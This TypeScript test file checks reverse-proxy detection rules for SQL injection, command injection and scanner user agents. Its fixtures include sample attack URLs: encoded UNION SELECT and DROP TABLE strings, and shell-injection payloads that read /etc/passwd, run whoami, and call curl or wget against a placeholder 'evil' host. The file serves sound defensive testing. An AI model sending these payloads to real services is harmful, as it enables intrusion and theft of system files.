/**
 * Detection-rule coverage tests.
 *
 * Rules are data, so a pattern can quietly stop matching what it was written
 * for without anything failing. These pin two blind spots found by firing
 * synthetic attacks through the live pipeline:
 *
 *  1. PROXY-001 missed percent-encoded SQL injection. The rules engine compiles
 *     patterns with `new RegExp(value)` — no flags — so matching is
 *     case-sensitive, and `\b` does not help after an encoded separator because
 *     in "%20UNION" the character before U is '0', a word character. Real
 *     tooling emits encoded, often lowercase payloads, so the rule caught
 *     roughly half of what it should.
 *  2. PROXY-005 keys on user_agent, which only some HTTP parsers capture.
 *
 * Run with `npm test` (tsx --test).
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'fs';
import * as path from 'path';
import * as yaml from 'js-yaml';
import { compileUserRegex } from './userRegex';

const RULES = path.join(__dirname, '../../../../rules');

function ruleRegex(file: string, field: string): RegExp {
  const doc = yaml.load(fs.readFileSync(path.join(RULES, file), 'utf8')) as any;
  const cond = doc.conditions.find((c: any) => c.field === field && c.operator === 'regex');
  assert.ok(cond, `${file} has no regex condition on ${field}`);
  // Compiled exactly as rulesEngine does, honouring the rule's own flags.
  const { regex } = compileUserRegex(String(cond.value), cond.flags);
  return regex;
}

const SQLI = ruleRegex('reverse-proxy/PROXY-001-sql-injection.yaml', 'path');

const ENCODED_ATTACKS: Array<[string, string]> = [
  ['percent-encoded quote (sqlmap default)', "/product?id=1%27"],
  ['percent-encoded double quote', '/product?id=1%22'],
  ['encoded UNION SELECT', '/product?id=-1%20UNION%20SELECT%201,2,3'],
  ['encoded lowercase union select', '/product?id=-1%20union%20select%201,2,3'],
  ['mixed-case keyword', '/product?id=1+UnIoN+SeLeCt+null'],
  ['encoded comment marker', '/product?id=1%2D%2D+'],
  ['encoded semicolon then DROP', '/product?id=1%3B+DROP+TABLE+users'],
  ['lowercase drop table', '/product?id=1;drop table users'],
  ['uppercase hex literal', '/product?id=0X4142'],
];

const LITERAL_ATTACKS: Array<[string, string]> = [
  ['literal quote', "/product?id=1'"],
  ['plus-separated UNION', '/search?q=1+UNION+SELECT+*+FROM+users--'],
  ['boolean OR injection', "/login?u=admin'+OR+'1'='1"],
];

// URLs that must NOT alert. A SQL-injection rule that fires on ordinary traffic
// is worse than one that misses, because the noise trains operators to ignore it.
const BENIGN = [
  '/index.html',
  '/api/v1/health',
  '/articles/communion-service', // contains "union"
  '/docs/selection-guide', // contains "select"
  '/search?q=cats+or+dogs', // natural-language lowercase "or"
  '/blog/my-first-post',
  '/static/js/app.min.js',
  '/report?year=2026&month=07',
  '/search?q=hello%20world',
  '/u/0f1e2d3c-4b5a-6978-8796-a5b4c3d2e1f0',
  '/products/dropdown-menu', // contains "drop"
  '/account/updates', // contains "update"
];

for (const [label, url] of [...ENCODED_ATTACKS, ...LITERAL_ATTACKS]) {
  test(`PROXY-001 detects SQL injection: ${label}`, () => {
    assert.ok(SQLI.test(url), `pattern did not match ${url}`);
  });
}

test('PROXY-001 does not fire on ordinary traffic', () => {
  const firing = BENIGN.filter((u) => SQLI.test(u));
  assert.deepEqual(firing, [], `false positives on: ${firing.join(', ')}`);
});

test('PROXY-005 keys on user_agent, so its source parser must capture one', () => {
  // The rule is only reachable from parsers that actually extract user_agent.
  // apache-nginx-access-log does not, which is why it must not sort ahead of
  // standard-nginx-access (see parserPriority.test.ts).
  const doc = yaml.load(
    fs.readFileSync(path.join(RULES, 'reverse-proxy/PROXY-005-malicious-user-agent.yaml'), 'utf8')
  ) as any;
  assert.ok(doc.conditions.some((c: any) => c.field === 'user_agent'));

  const catalog = path.join(__dirname, '../../../../catalog/parsers');
  const capturing = fs
    .readdirSync(catalog)
    .filter((f) => f.endsWith('.parser.json'))
    .map((f) => JSON.parse(fs.readFileSync(path.join(catalog, f), 'utf8')))
    .filter((p) => JSON.stringify(p.field_mappings).includes('user_agent'));

  assert.ok(capturing.length > 0, 'no catalog parser captures user_agent at all');
});


// ---------------------------------------------------------------------------
// PROXY-002 had the same two blind spots as PROXY-001: case-sensitive matching
// (so CURL/WGET/PowerShell slipped past a lowercase keyword list) and no
// coverage of percent-encoded separators. It now declares `flags: i` and
// mirrors the literal branches for %3B / %7C / %24%28.
// ---------------------------------------------------------------------------

const CMDI = ruleRegex('reverse-proxy/PROXY-002-command-injection.yaml', 'path');

const CMDI_ATTACKS: Array<[string, string]> = [
  ['lowercase ;cat', '/ping?host=127.0.0.1;cat+/etc/passwd'],
  ['uppercase ;CAT', '/ping?host=127.0.0.1;CAT+/etc/passwd'],
  ['mixed-case ;CuRl', '/ping?host=1.1.1.1;CuRl+http://evil'],
  ['uppercase ;WGET', '/ping?host=1.1.1.1;WGET+http://evil'],
  ['capitalised PowerShell', '/run?c=1;PowerShell+-enc+ZQBj'],
  ['encoded semicolon + cat', '/ping?host=127.0.0.1%3Bcat%20/etc/passwd'],
  ['encoded semicolon + CURL', '/ping?host=127.0.0.1%3BCURL%20http://evil'],
  ['encoded pipe + id', '/ping?host=127.0.0.1%7Cid'],
  ['encoded command substitution', '/run?c=%24%28whoami%29'],
  ['literal pipe + whoami', '/ping?host=1.1.1.1|whoami'],
  ['backtick substitution', '/run?c=`id`'],
  ['newline injection', '/run?c=1%0awhoami'],
];

// "cat", "bash" and friends appear in ordinary URLs — they must only alert when
// preceded by a shell metacharacter, encoded or not.
const CMDI_BENIGN = [
  '/index.html',
  '/api/v1/health',
  '/docs/bash-scripting-guide',
  '/catalog/items',
  '/categories/shoes',
  '/blog/how-to-curl-an-api',
  '/search?q=hello%20world',
  '/products?category=shoes&size=10',
  '/report?year=2026&month=07',
  '/static/js/app.min.js',
];

for (const [label, url] of CMDI_ATTACKS) {
  test(`PROXY-002 detects command injection: ${label}`, () => {
    assert.ok(CMDI.test(url), `pattern did not match ${url}`);
  });
}

test('PROXY-002 does not fire on ordinary traffic', () => {
  const firing = CMDI_BENIGN.filter((u) => CMDI.test(u));
  assert.deepEqual(firing, [], `false positives on: ${firing.join(', ')}`);
});

test('PROXY-002 declares the flags it depends on', () => {
  // The keyword lists are lowercase; without flags: i the rule silently reverts
  // to catching only lowercase payloads.
  const doc = yaml.load(
    fs.readFileSync(path.join(RULES, 'reverse-proxy/PROXY-002-command-injection.yaml'), 'utf8')
  ) as any;
  const cond = doc.conditions.find((c: any) => c.operator === 'regex');
  assert.equal(cond.flags, 'i');
});


// ---------------------------------------------------------------------------
// PROXY-005 keys on user_agent, which scanners capitalise inconsistently. Plain
// case-insensitivity is NOT enough here: several tokens are short words that
// occur inside legitimate agents, so `flags: i` alone starts firing on
// Zapier/1.0 and HydrationTracker. The word boundaries are load-bearing — and
// they also fix a false positive that predates the flag, since lowercase
// "zapier/1.0" matched the bare "zap" alternative.
// ---------------------------------------------------------------------------

const SCANNER_UA = ruleRegex('reverse-proxy/PROXY-005-malicious-user-agent.yaml', 'user_agent');

const SCANNER_AGENTS: Array<[string, string]> = [
  ['sqlmap lowercase', 'sqlmap/1.7.2#stable (http://sqlmap.org)'],
  ['SQLMap capitalised', 'SQLMap/1.7.2'],
  ['Nikto', 'Mozilla/5.00 (Nikto/2.5.0) (Evasions:None)'],
  ['Nmap NSE', 'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)'],
  ['ZAP', 'Mozilla/5.0 (X11; Linux x86_64) ZAP/2.14.0'],
  ['zaproxy', 'zaproxy/2.14.0'],
  ['Burp Suite', 'Mozilla/5.0 (Burp Suite Professional)'],
  ['masscan', 'masscan/1.3.2'],
  ['WPScan', 'WPScan v3.8.22 (https://wpscan.com/wordpress-security-scanner)'],
  ['gobuster', 'gobuster/3.6'],
  ['Nessus', 'Mozilla/5.0 (compatible; Nessus)'],
  ['w3af', 'w3af.org'],
  ['Hydra', 'Hydra/9.5'],
];

const LEGITIMATE_AGENTS: Array<[string, string]> = [
  ['Chrome', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36'],
  ['Firefox', 'Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0'],
  ['Safari iOS', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) Version/17.5 Safari/604.1'],
  ['curl', 'curl/8.5.0'],
  ['Googlebot', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'],
  // Contains "zap". Capitalised did not match before the flag; lowercase DID —
  // an existing false positive the word boundaries remove.
  ['Zapier capitalised', 'Zapier/1.0'],
  ['zapier lowercase', 'zapier/1.0'],
  ['Uptime Kuma', 'Uptime-Kuma/1.23.13'],
  ['Postman', 'PostmanRuntime/7.39.0'],
  ['Datadog', 'Datadog Agent/7.54.0'],
  ['python-requests', 'python-requests/2.32.3'],
  ['app containing "hydra"', 'HydrationTracker/2.1 (iOS)'],
];

for (const [label, ua] of SCANNER_AGENTS) {
  test(`PROXY-005 detects scanner user-agent: ${label}`, () => {
    assert.ok(SCANNER_UA.test(ua), `pattern did not match ${ua}`);
  });
}

test('PROXY-005 does not fire on legitimate user agents', () => {
  const firing = LEGITIMATE_AGENTS.filter(([, ua]) => SCANNER_UA.test(ua)).map(([l]) => l);
  assert.deepEqual(firing, [], `false positives on: ${firing.join(', ')}`);
});

test('PROXY-005 keeps the word boundaries its flags depend on', () => {
  // Regression guard: dropping \b while keeping flags: i reintroduces the
  // Zapier/HydrationTracker false positives measured when this was written.
  const doc = yaml.load(
    fs.readFileSync(path.join(RULES, 'reverse-proxy/PROXY-005-malicious-user-agent.yaml'), 'utf8')
  ) as any;
  const cond = doc.conditions.find((c: any) => c.operator === 'regex');
  assert.equal(cond.flags, 'i');
  assert.match(String(cond.value), /^\\b\(/, 'alternation must be wrapped in word boundaries');
  assert.match(String(cond.value), /\)\\b$/, 'alternation must be wrapped in word boundaries');
});
